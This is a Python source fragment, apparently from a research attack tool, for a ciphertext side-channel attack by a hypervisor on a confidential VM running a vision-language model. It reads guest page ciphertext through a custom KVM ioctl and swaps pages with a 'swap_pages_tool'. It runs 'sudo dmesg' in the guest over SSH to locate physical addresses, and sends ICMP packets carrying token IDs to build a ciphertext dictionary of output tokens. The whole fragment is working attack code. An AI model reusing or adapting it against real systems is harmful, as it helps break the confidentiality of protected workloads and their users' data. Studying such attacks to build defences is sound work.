# ---------------------------------------------------------------------------
# KVM ioctl for ciphertext read (same as orchestrate_v2.py)
# ---------------------------------------------------------------------------

_KVMIO      = 0xAE
_PAGE_SIZE  = 4096
KVM_READ_PAGE_DUMP = (0x80000000
                      | ((_PAGE_SIZE & 0x3FFF) << 16)
                      | (_KVMIO << 8)
                      | 0x2b)

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


def run(label: str, cmd: list) -> None:
    log(f"  $ {' '.join(str(c) for c in cmd)}")
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        log_err(f"[!] {label} failed (exit {rc})")
        sys.exit(1)


def _bytes_to_xp_dump(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, _PAGE_SIZE, 16):
        addr = gpa + i
        lo = int.from_bytes(raw[i:i+8],    "little")
        hi = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{addr:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def do_swap_read(swap_tool: str, dict_gpa: int, src_gpa: int,
                 out_path: Path, kvm_dev: str = "/dev/kvm") -> None:
    run("swap_pages_tool (swap-back)",
        [swap_tool, f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"])
    kvm_fd = os.open(kvm_dev, os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(_PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)
    dump = _bytes_to_xp_dump(dict_gpa, raw)
    out_path.write_text(dump + "\n")
    log(f"  saved → {out_path.name}")


# ---------------------------------------------------------------------------
# ICMP send + GPA acquisition  (uses send_tokens._send_one_quiet directly)
# ---------------------------------------------------------------------------

def _send_and_get_gpa(token_ids: list[int], prefix: int = 0) -> tuple[int, int]:
    """
    Send one ICMP packet with token_ids at given prefix, parse GPA + frag_p1.
    Returns (gpa, frag_p1).  Raises RuntimeError if no GPA found.
    """
    sys.path.insert(0, str(HERE))
    from send_tokens import _send_one_quiet  # type: ignore  # host-only, lazy import

    ssh("sudo dmesg -C")
    _send_one_quiet(token_ids, prefix=prefix)
    time.sleep(1)

    out = ""
    gpas = []
    for attempt in range(3):
        out = ssh("sudo dmesg", timeout=40)
        gpas = re.findall(r"sub-page\[\d+\]\s+GPA=0x([0-9a-f]+)", out, re.IGNORECASE)
        if gpas:
            break
        if attempt < 2:
            time.sleep(3)

    if not gpas:
        raise RuntimeError("[!] No GPA in guest dmesg")

    gpa = int(gpas[-1], 16)
    frag_p1 = 970  # fallback
    m = re.search(r"frag\[0\].*?\boff=(\d+)", out)
    if m:
        frag_off = int(m.group(1))
        frag_p1 = 4096 - (frag_off % 4096) - 8
    return gpa, frag_p1


def _acquire_with_retry(token_ids: list[int], prefix: int = 0,
                        retries: int = 5) -> tuple[int, int]:
    """_send_and_get_gpa with exponential back-off."""
    for attempt in range(retries):
        try:
            return _send_and_get_gpa(token_ids, prefix)
        except RuntimeError as e:
            log_err(f"  {e} (attempt {attempt + 1}/{retries})")
            if attempt < retries - 1:
                wait = 10 * (attempt + 1)
                log(f"  sleeping {wait}s before retry...")
                time.sleep(wait)
    raise RuntimeError(f"_send_and_get_gpa failed after {retries} attempts")


# ---------------------------------------------------------------------------
# Guest ICMP RX buffer drain
# ---------------------------------------------------------------------------

def drain_guest_rxbuf() -> None:
    out = ssh(
        "sudo python3 << 'PYEOF'\n"
        "import socket, select\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n"
        "s.setblocking(False)\n"
        "n = 0\n"
        "while select.select([s], [], [], 0.3)[0]:\n"
        "    try:\n"
        "        s.recv(65536)\n"
        "        n += 1\n"
        "    except OSError:\n"
        "        break\n"
        "s.close()\n"
        "print(f'drained {n} pkts')\n"
        "PYEOF",
        timeout=20,
    )
    log(f"  [drain] {out.strip()}")


# ---------------------------------------------------------------------------
# Phase 0: build output token dictionary
# ---------------------------------------------------------------------------

def build_output_dict(swap_tool: str) -> dict:
    """
    Build phase: one ICMP send per (token_idx, phase) covers all offsets
    at L-byte intervals — identical strategy to orchestrate_v2.py build_dict.

    Since all OUTPUT_TOKEN_LABELS are single tokens (8 B each, L=8),
    n_phases=1 per token and ONE dump covers all 512 offsets on the page.

    Total sends: n_tokens × 3  (2 probes + 1 aligned send each).

    Saves output_dict_cache.json and per-phase files in output_dict_pages/.
    Always rebuilds from scratch (removes existing cache).
    Returns {token_offset_hex: {token_idx_str: {gpa, cp_file, landing_ok}}}.
    """
    OUTPUT_DICT_DIR.mkdir(exist_ok=True)

    if OUTPUT_DICT_CACHE.exists():
        OUTPUT_DICT_CACHE.unlink()
        log("[build] Removed existing output_dict_cache.json")
    for f in OUTPUT_DICT_DIR.glob("*.out"):
        f.unlink()
    log(f"[build] Cleared {OUTPUT_DICT_DIR.name}/ — building from scratch")

    cache: dict = {}

    total_phases = sum(len(ids) for _, ids in OUTPUT_TOKEN_LABELS)
    phase_num    = 0
    drain_count  = 0

    for token_idx, (label, token_ids) in enumerate(OUTPUT_TOKEN_LABELS):
        L        = len(token_ids) * 8   # payload repeat period in bytes
        n_phases = L // 8               # distinct 8-byte-aligned starting positions

        for phase in range(n_phases):
            phase_num      += 1
            target_landing  = phase * 8
            cp_name = f"out_t{token_idx}_p{phase}"
            cp_path = OUTPUT_DICT_DIR / f"{cp_name}.out"

            covered = [target_landing + k * L
                       for k in range(4096 // L + 1)
                       if target_landing + k * L < 4096]

            if cp_path.exists() and all(
                hex(o) in cache and str(token_idx) in cache[hex(o)]
                for o in covered
            ):
                log(f"[build {phase_num}/{total_phases}] token_idx={token_idx} '{label}'"
                    f"  phase={phase}  [skip — {len(covered)} offsets already registered]")
                continue

            log(f"\n[build {phase_num}/{total_phases}] token_idx={token_idx} '{label}'"
                f"  L={L}B  n_phases={n_phases}  phase={phase}"
                f"  target_landing=0x{target_landing:x}"
                f"  covers {len(covered)} offsets")

            drain_count += 1
            if drain_count % DRAIN_EVERY == 0:
                log("  [drain] flushing guest ICMP receive buffer...")
                drain_guest_rxbuf()

            # 2 probes to measure ring-advance delta
            try:
                log("  [probe1] prefix=0 ...")
                _, frag_p1_a = _acquire_with_retry(token_ids, prefix=0)
                log("  [probe2] prefix=0 ...")
                _, frag_p1_b = _acquire_with_retry(token_ids, prefix=0)
            except RuntimeError as e:
                log_err(f"  [!] Probe failed: {e} — skipping phase")
                continue

            delta         = (frag_p1_a - frag_p1_b) % 4096
            expected_frag = (frag_p1_b - delta) % 4096
            prefix        = target_landing + expected_frag
            log(f"  frag_p1: {frag_p1_a},{frag_p1_b}  delta={delta}"
                f"  expected={expected_frag}  prefix={prefix}")

            # Aligned send
            try:
                dict_gpa, actual_frag_p1 = _acquire_with_retry(token_ids, prefix=prefix)
            except RuntimeError as e:
                log_err(f"  [!] Aligned send failed: {e} — skipping phase")
                continue

            actual_landing = (prefix - actual_frag_p1) % 4096
            landing_ok     = (actual_landing == target_landing)
            log(f"  dict_gpa=0x{dict_gpa:x}  actual_frag_p1={actual_frag_p1}"
                f"  actual_landing=0x{actual_landing:x}"
                f"  {'OK' if landing_ok else f'MISMATCH (expected 0x{target_landing:x})'}")

            # Dump full 4 KB page — one dump covers all L-spaced offsets
            run("read_gpa (output dict build)",
                [sys.executable, str(READ_GPA), str(OUTPUT_DICT_DIR / cp_name),
                 f"0x{dict_gpa:x}"])
            log(f"  dump -> {cp_path.name}")

            # Register all offsets where this token lands on the page
            actual_covered = []
            for k in range(4096 // L + 1):
                offset = actual_landing + k * L
                if offset >= 4096:
                    break
                off_key = hex(offset)
                if off_key not in cache:
                    cache[off_key] = {}
                cache[off_key][str(token_idx)] = {
                    "gpa":        hex(dict_gpa),
                    "cp_file":    str(cp_path),
                    "landing_ok": landing_ok,
                }
                actual_covered.append(off_key)
            log(f"  registered {len(actual_covered)} offsets: "
                f"{actual_covered[:4]}{'...' if len(actual_covered) > 4 else ''}")

        # Persist after each token_idx
        with open(OUTPUT_DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)

    built = sum(len(v) for v in cache.values())
    log(f"[build] Complete. {built} (offset×token) entries in {OUTPUT_DICT_CACHE}")
    return cache


# ---------------------------------------------------------------------------
# --print-token-ids helper  (run on guest inside vlm conda env)
